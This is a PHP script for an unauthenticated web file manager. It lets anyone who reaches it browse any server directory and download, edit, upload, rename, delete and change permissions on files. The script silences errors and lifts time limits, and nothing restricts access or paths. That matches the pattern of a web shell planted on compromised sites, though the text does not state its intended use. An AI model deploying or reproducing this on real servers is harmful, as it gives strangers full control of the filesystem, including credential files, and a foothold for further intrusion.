<?php
@set_time_limit(0);
@error_reporting(0);

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);

function h($s) { return htmlspecialchars($s, ENT_QUOTES); }
function formatBytes($size) {
    if($size < 1024) return $size.' B';
    $units = ['KB','MB','GB','TB'];
    for($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
    return round($size, 1).' '.$units[$i];
}

function formatDate($timestamp) {
    return date('M j, Y H:i', $timestamp);
}

function formatPermissions($perms) {
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return substr($info, 1);
}

// Handle navigation
if(isset($_GET['cd'])) {
    $new = realpath($path.'/'.$_GET['cd']);
    if(is_dir($new)) { header("Location: ?path=".urlencode($new)); exit; }
}

// Handle file operations
if(isset($_GET['del'])) {
    $target = realpath($path.'/'.$_GET['del']);
    if(is_file($target)) unlink($target);
    if(is_dir($target)) @rmdir($target);
    header("Location: ?path=".urlencode($path)); exit;
}

if(isset($_GET['dl'])) {
    $target = realpath($path.'/'.$_GET['dl']);
    if(is_file($target)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"".basename($target)."\"");
        readfile($target); exit;
    }
}

// File editor
if(isset($_GET['edit'])) {
    $file = realpath($path.'/'.$_GET['edit']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=".urlencode($path)); exit;
    }
    
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>".h(basename($file))."</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1f1f1f;color:#e8eaed;height:100vh;display:flex;flex-direction:column}
.header{background:#2d2e30;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #5f6368}
.title{color:#e8eaed;font-size:16px;font-weight:500;display:flex;align-items:center;gap:8px}
.actions{display:flex;gap:12px}
.btn{background:#1a73e8;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:14px;text-decoration:none;display:flex;align-items:center;gap:6px}
.btn:hover{background:#1557b0}
.btn-secondary{background:#3c4043;color:#e8eaed}
.btn-secondary:hover{background:#5f6368}
.editor{flex:1;width:100%;background:#1f1f1f;color:#e8eaed;border:none;padding:20px;font-family:'Courier New',monospace;font-size:14px;resize:none;outline:none}
.status{background:#2d2e30;padding:8px 20px;color:#9aa0a6;font-size:12px;display:flex;justify-content:space-between;border-top:1px solid #5f6368}
</style></head><body>
<form method='POST' style='height:100%;display:flex;flex-direction:column'>
<div class='header'>
<div class='title'><i class='fas fa-edit'></i>".h(basename($file))."</div>
<div class='actions'>
<button class='btn' type='submit'><i class='fas fa-save'></i>Save</button>
<a href='?path=".urlencode(dirname($file))."' class='btn btn-secondary'><i class='fas fa-arrow-left'></i>Back</a>
</div></div>
<textarea name='content' class='editor' placeholder='Start typing...'>".h(file_get_contents($file))."</textarea>
<div class='status'><span>".h(basename($file))." • ".formatBytes(filesize($file))."</span><span>Ready</span></div>
</form></body></html>";
    exit;
}

// Handle permissions change
if(isset($_GET['chmod'])) {
    $file = realpath($path.'/'.$_GET['chmod']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newPerms = octdec($_POST['permissions']);
        chmod($file, $newPerms);
        header("Location: ?path=".urlencode($path)); exit;
    }
    $currentPerms = substr(sprintf('%o', fileperms($file)), -3);
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1f1f1f;color:#e8eaed;min-height:100vh;display:flex;align-items:center;justify-content:center}
.form{background:#2d2e30;padding:24px;border-radius:8px;width:100%;max-width:450px}
.title{color:#e8eaed;margin-bottom:20px;font-size:18px;font-weight:500;display:flex;align-items:center;gap:8px}
.perm-group{margin-bottom:16px;padding:12px;background:#3c4043;border-radius:4px}
.perm-title{font-size:14px;font-weight:500;margin-bottom:8px;color:#9aa0a6}
.checkboxes{display:flex;gap:16px}
.checkbox{display:flex;align-items:center;gap:4px;font-size:13px}
input[type=checkbox]{margin:0}
.octal-input{width:100%;padding:12px;background:#1f1f1f;border:1px solid #5f6368;border-radius:4px;color:#e8eaed;font-size:14px;margin:16px 0;text-align:center;font-family:monospace}
.octal-input:focus{outline:none;border-color:#1a73e8}
.current{background:#3c4043;padding:8px;border-radius:4px;margin-bottom:16px;font-size:13px;color:#9aa0a6}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 16px;border-radius:4px;cursor:pointer;font-size:14px;margin-right:8px}
.btn:hover{background:#1557b0}
.btn-cancel{background:#3c4043;color:#e8eaed;text-decoration:none}
.btn-cancel:hover{background:#5f6368}
</style></head><body>
<div class='form'>
<div class='title'><i class='fas fa-lock'></i>Edit Permissions</div>
<div class='current'>Current: ".formatPermissions(fileperms($file))." ($currentPerms)</div>
<form method='POST'>
<div class='perm-group'>
<div class='perm-title'>Owner</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='owner_r' ".($currentPerms[0]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='owner_w' ".($currentPerms[0]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='owner_x' ".($currentPerms[0]&1?'checked':'')."> Execute</label>
</div></div>
<div class='perm-group'>
<div class='perm-title'>Group</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='group_r' ".($currentPerms[1]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='group_w' ".($currentPerms[1]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='group_x' ".($currentPerms[1]&1?'checked':'')."> Execute</label>
</div></div>
<div class='perm-group'>
<div class='perm-title'>Others</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='other_r' ".($currentPerms[2]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='other_w' ".($currentPerms[2]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='other_x' ".($currentPerms[2]&1?'checked':'')."> Execute</label>
</div></div>
<input type='text' name='permissions' class='octal-input' value='$currentPerms' placeholder='755' pattern='[0-7]{3}' title='3-digit octal permissions'>
<button class='btn' type='submit'><i class='fas fa-save'></i> Apply</button>
<a href='?path=".urlencode($path)."' class='btn-cancel btn'><i class='fas fa-times'></i> Cancel</a>
</form>
<script>
const checkboxes = document.querySelectorAll('input[type=checkbox]');
const octalInput = document.querySelector('.octal-input');
function updateOctal() {
    let owner = 0, group = 0, other = 0;
    if(document.querySelector('[name=owner_r]').checked) owner += 4;
    if(document.querySelector('[name=owner_w]').checked) owner += 2;
    if(document.querySelector('[name=owner_x]').checked) owner += 1;
    if(document.querySelector('[name=group_r]').checked) group += 4;
    if(document.querySelector('[name=group_w]').checked) group += 2;
    if(document.querySelector('[name=group_x]').checked) group += 1;
    if(document.querySelector('[name=other_r]').checked) other += 4;
    if(document.querySelector('[name=other_w]').checked) other += 2;
    if(document.querySelector('[name=other_x]').checked) other += 1;
    octalInput.value = owner.toString() + group.toString() + other.toString();
}
checkboxes.forEach(cb => cb.addEventListener('change', updateOctal));
</script>
</div></body></html>";
    exit;
}
if(isset($_GET['rename'])) {
    $old = realpath($path.'/'.$_GET['rename']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        rename($old, $path.'/'.$_POST['newname']);
        header("Location: ?path=".urlencode($path)); exit;
    }
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1f1f1f;color:#e8eaed;min-height:100vh;display:flex;align-items:center;justify-content:center}
.form{background:#2d2e30;padding:24px;border-radius:8px;width:100%;max-width:400px}
.title{color:#e8eaed;margin-bottom:16px;font-size:18px;font-weight:500;display:flex;align-items:center;gap:8px}
input{width:100%;padding:12px;background:#1f1f1f;border:1px solid #5f6368;border-radius:4px;color:#e8eaed;font-size:14px;margin-bottom:16px}
input:focus{outline:none;border-color:#1a73e8}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 16px;border-radius:4px;cursor:pointer;font-size:14px;margin-right:8px}
.btn:hover{background:#1557b0}
.btn-cancel{background:#3c4043;color:#e8eaed;text-decoration:none}
.btn-cancel:hover{background:#5f6368}
</style></head><body>
<div class='form'>
<div class='title'><i class='fas fa-edit'></i>Rename</div>
<form method='POST'>
<input type='text' name='newname' value='".h(basename($old))."' required autofocus>
<button class='btn' type='submit'>Rename</button>
<a href='?path=".urlencode($path)."' class='btn-cancel btn'>Cancel</a>
</form></div></body></html>";
    exit;
}

// Handle uploads and new items
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.basename($_FILES['file']['name']));
    }
    if(isset($_POST['newfolder'])) mkdir($path.'/'.$_POST['newfolder']);
    if(isset($_POST['newfile'])) file_put_contents($path.'/'.$_POST['newfile'], "");
    header("Location: ?path=".urlencode($path)); exit;
}

// Get files and folders
$items = scandir($path);
$dirs = $files = [];
foreach($items as $item) {
    if($item === "." || $item === "..") continue;
    $full = $path.'/'.$item;
    if(is_dir($full)) $dirs[] = $item; else $files[] = $item;
}
sort($dirs); sort($files);

// File icons
function getIcon($item, $isDir) {
    if($isDir) return 'fas fa-folder';
    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
    $icons = [
        'php'=>'fab fa-php', 'js'=>'fab fa-js', 'html'=>'fab fa-html5', 'css'=>'fab fa-css3',
        'json'=>'fas fa-code', 'xml'=>'fas fa-code', 'txt'=>'fas fa-file-alt', 'md'=>'fab fa-markdown',
        'jpg'=>'fas fa-image', 'jpeg'=>'fas fa-image', 'png'=>'fas fa-image', 'gif'=>'fas fa-image',
        'pdf'=>'fas fa-file-pdf', 'zip'=>'fas fa-file-archive', 'sql'=>'fas fa-database'
    ];
    return isset($icons[$ext]) ? $icons[$ext] : 'fas fa-file';
}

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>File Manager</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1f1f1f;color:#e8eaed;line-height:1.5}
.container{max-width:1200px;margin:0 auto;padding:20px}
.header{background:#2d2e30;padding:16px 20px;border-radius:8px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
.header h1{font-size:20px;font-weight:500;color:#e8eaed}
.breadcrumb{background:#3c4043;padding:8px 12px;border-radius:4px;font-size:13px;margin-top:8px}
.breadcrumb a{color:#8ab4f8;text-decoration:none}
.breadcrumb a:hover{text-decoration:underline}
.toolbar{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;margin-bottom:20px}
.tool{background:#2d2e30;padding:12px;border-radius:6px;display:flex;align-items:center;gap:8px}
.tool input{flex:1;background:#1f1f1f;border:1px solid #5f6368;border-radius:4px;padding:8px;color:#e8eaed;font-size:14px}
.tool input:focus{outline:none;border-color:#1a73e8}
.btn{background:#1a73e8;color:#fff;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;font-size:13px;white-space:nowrap}
.btn:hover{background:#1557b0}
.files{background:#2d2e30;border-radius:8px;overflow:hidden}
.file-header{background:#3c4043;padding:12px 16px;display:grid;grid-template-columns:1fr 80px 100px 140px 120px 140px;gap:12px;font-size:13px;font-weight:500;color:#9aa0a6}
.file-row{padding:12px 16px;display:grid;grid-template-columns:1fr 80px 100px 140px 120px 140px;gap:12px;align-items:center;border-bottom:1px solid #3c4043;transition:background 0.2s}
.file-row:hover{background:#3c4043}
.file-name{display:flex;align-items:center;gap:8px;color:#e8eaed;text-decoration:none}
.file-name:hover{color:#8ab4f8}
.file-name i{width:16px;color:#9aa0a6}
.file-type{background:#5f6368;color:#e8eaed;padding:2px 6px;border-radius:3px;font-size:11px;text-transform:uppercase}
.dir-type{background:#1a73e8}
.file-size{color:#9aa0a6;font-size:13px}
.file-actions{display:flex;gap:8px}
.file-actions a{color:#9aa0a6;font-size:12px;text-decoration:none;padding:4px;border-radius:3px;transition:all 0.2s}
.file-actions a:hover{color:#8ab4f8;background:#3c4043}
.file-date{color:#9aa0a6;font-size:12px}
.file-perms{color:#9aa0a6;font-size:11px;font-family:monospace;cursor:pointer}
.file-perms:hover{color:#8ab4f8}
@media(max-width:768px){
.toolbar{grid-template-columns:1fr}
.file-header{display:none}
.file-row{grid-template-columns:1fr;gap:8px;padding:16px}
.file-actions{margin-top:8px}
}
</style></head><body>
<div class='container'>
<div class='header'>
<i class='fas fa-hdd'></i>
<div>
<h1>File Manager</h1>
<div class='breadcrumb'>";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$crumb = '';
foreach($parts as $i => $part) {
    if($part === '') continue;
    $crumb .= DIRECTORY_SEPARATOR.$part;
    if($i === count($parts)-1) {
        echo "<strong>".h($part)."</strong>";
    } else {
        echo "<a href='?path=".urlencode($crumb)."'>".h($part)."</a> / ";
    }
}

echo "</div></div></div>
<div class='toolbar'>
<form method='POST' enctype='multipart/form-data' class='tool'>
<i class='fas fa-upload'></i>
<input type='file' name='file' required>
<button class='btn' type='submit'>Upload</button>
</form>
<form method='POST' class='tool'>
<i class='fas fa-folder-plus'></i>
<input type='text' name='newfolder' placeholder='Folder name' required>
<button class='btn' type='submit'>Create</button>
</form>
<form method='POST' class='tool'>
<i class='fas fa-file-plus'></i>
<input type='text' name='newfile' placeholder='File name' required>
<button class='btn' type='submit'>Create</button>
</form>
</div>
<div class='files'>
<div class='file-header'>
<div>Name</div><div>Type</div><div>Size</div><div>Modified</div><div>Permissions</div><div>Actions</div>
</div>";

// Display directories
foreach($dirs as $item) {
    $full = $path.'/'.$item;
    $modified = formatDate(filemtime($full));
    $perms = formatPermissions(fileperms($full));
    echo "<div class='file-row'>
    <a href='?path=".urlencode($full)."' class='file-name'>
    <i class='".getIcon($item, true)."'></i>".h($item)."</a>
    <div class='file-type dir-type'>DIR</div>
    <div class='file-size'>-</div>
    <div class='file-date'>$modified</div>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='file-perms' title='Click to edit permissions'>$perms</a>
    <div class='file-actions'>
    <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' title='Rename'><i class='fas fa-edit'></i></a>
    <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete?\")' title='Delete'><i class='fas fa-trash'></i></a>
    </div></div>";
}

// Display files
foreach($files as $item) {
    $full = $path.'/'.$item;
    $size = filesize($full);
    $modified = formatDate(filemtime($full));
    $perms = formatPermissions(fileperms($full));
    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
    echo "<div class='file-row'>
    <div class='file-name'><i class='".getIcon($item, false)."'></i>".h($item)."</div>
    <div class='file-type'>".strtoupper($ext ?: 'FILE')."</div>
    <div class='file-size'>".formatBytes($size)."</div>
    <div class='file-date'>$modified</div>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='file-perms' title='Click to edit permissions'>$perms</a>
    <div class='file-actions'>
    <a href='?path=".urlencode($path)."&dl=".urlencode($item)."' title='Download'><i class='fas fa-download'></i></a>
    <a href='?path=".urlencode($path)."&edit=".urlencode($item)."' title='Edit'><i class='fas fa-edit'></i></a>
    <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' title='Rename'><i class='fas fa-pen'></i></a>
    <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete?\")' title='Delete'><i class='fas fa-trash'></i></a>
    </div></div>";
}

echo "</div></div></body></html>";
?>